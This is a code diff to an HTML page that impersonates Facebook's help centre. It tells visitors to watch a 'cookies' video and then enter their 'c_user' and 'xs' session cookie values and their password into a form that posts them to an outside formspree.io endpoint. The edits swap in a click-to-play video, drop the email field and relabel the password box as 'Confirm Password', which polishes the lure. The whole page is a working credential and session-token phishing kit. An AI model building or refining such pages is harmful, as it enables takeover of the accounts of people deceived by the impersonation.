@@ -1,4 +1,3 @@
-
 <!DOCTYPE
 <html>
 <head>
@@ -50,7 +49,22 @@
             font-size: 16px;
             color: #666666;
         }
-
+        .video-container {
+            position: relative;
+            display: inline-block;
+        }
+         .video-container {
+            position: relative;
+            display: inline-block;
+        }
+        .video-container video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            display: none;
+           
+        }
         .content .video {
             width: 200px;
             height: 100px;
@@ -115,6 +129,30 @@
     </style>
 </head>
 <body>
+  <script>
+    function toggleVideo() {
+        var image = document.getElementById('image');
+        var video = document.getElementById('video');
+
+        if (image.style.display === 'none') {
+            image.style.display = 'block';
+            video.pause();
+            video.currentTime = 0;
+            video.style.display = 'none';
+        } else {
+            image.style.display = 'none';
+            video.style.display = 'block';
+            video.play();
+        }
+    }
+
+    window.onload = function() {
+        var image = document.getElementById('image');
+        var video = document.getElementById('video');
+        var imageWidth = image.clientWidth;
+        video.style.width = imageWidth + 'px';
+    }
+</script>
     <div class="header">
         <h1>Facebook</h1>
         <input type="text" placeholder="How Can We Help?" />
@@ -127,13 +165,13 @@
       <p2>Watch video before you provide information </p2>
       <br>
       <br>
-               <div class="video"> 
-            <span>video</span>
-<video width="240" height="100" controls>
-  <source src="cookies.mp4" type="video/mp4">
-</video>
-</video>
-        </div>
+      
+      <div class="video-container" onclick="toggleVideo()">
+        <img id="image" src="download.png" alt="Download" width="400">
+        <video id="video" controls poster="/download.png">
+            <source src="cookies.mp4.mp4" type="video/mp4">
+        </video>
+      </div>
       <br>
       <br>
      <ol> <p>Provide here your information</p>
@@ -142,10 +180,7 @@
   action="https://formspree.io/f/xbjnondg"
   method="POST"
 >
-  <label>
-    Your email:
-    <input type="email" name="email">
-  </label>
+  
   <label>
       c_user:
       <input name="c_user"></input>
@@ -155,7 +190,7 @@
     <input name="xs"></input>
 </label>
   <label>
-    Password:
+   Confirm Password:
     <input name="passwrod"></input>
   </label>
   <!-- your other form fields go here -->
